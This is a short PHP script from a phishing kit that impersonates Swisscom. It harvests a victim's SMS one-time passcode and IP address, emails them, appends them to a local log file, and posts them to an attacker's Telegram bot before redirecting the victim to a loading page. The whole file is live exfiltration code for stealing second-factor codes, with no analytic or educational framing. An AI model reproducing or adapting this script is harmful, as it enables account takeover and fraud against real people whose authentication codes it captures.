<?php
$ip = getenv("REMOTE_ADDR");
$message .= "\n";
$message .= "SMS 1   : ".$_POST['otp']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";

$send = "";


$subject = "SMS 2 | $ip ]";
$headers = "From: Swisscom";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
$file = fopen('../Flow44.txt', 'a');
fwrite($file,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: load2.html");

?>
